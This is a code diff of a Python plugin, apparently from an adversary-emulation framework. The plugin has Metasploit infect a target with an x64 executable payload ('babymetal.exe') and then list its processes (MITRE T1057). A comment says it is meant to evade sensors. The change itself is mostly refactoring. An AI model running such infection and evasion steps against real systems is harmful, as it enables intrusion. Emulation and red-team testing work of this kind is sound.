@@ -2,8 +2,7 @@
 
 # A plugin to nmap targets slow motion, to evade sensors
 
-from plugins.base.attack import AttackPlugin
-from app.metasploit import MetasploitInstant
+from plugins.base.attack import AttackPlugin, Requirement
 
 
 class MetasploitPsPlugin(AttackPlugin):
@@ -15,6 +14,8 @@ class MetasploitPsPlugin(AttackPlugin):
     references = ["https://attack.mitre.org/techniques/T1057/"]
 
     required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
+
+    requirements = [Requirement.METASPLOIT]
 
     def __init__(self):
         super().__init__()
@@ -31,13 +32,12 @@ class MetasploitPsPlugin(AttackPlugin):
         payload_name = "babymetal.exe"
         target = self.targets[0]
 
-        metasploit = MetasploitInstant(self.metasploit_password,
-                                       attack_logger=self.attack_logger,
-                                       attacker=self.attacker_machine_plugin,
-                                       username=self.metasploit_user)
+        self.metasploit.smart_infect(target,
+                                     payload=payload_type,
+                                     outfile=payload_name,
+                                     format="exe",
+                                     architecture="x64")
 
-        metasploit.smart_infect(target, payload_type, payload_name, )
-
-        metasploit.ps_process_discovery(target)
+        self.metasploit.ps_process_discovery(target)
 
         return res
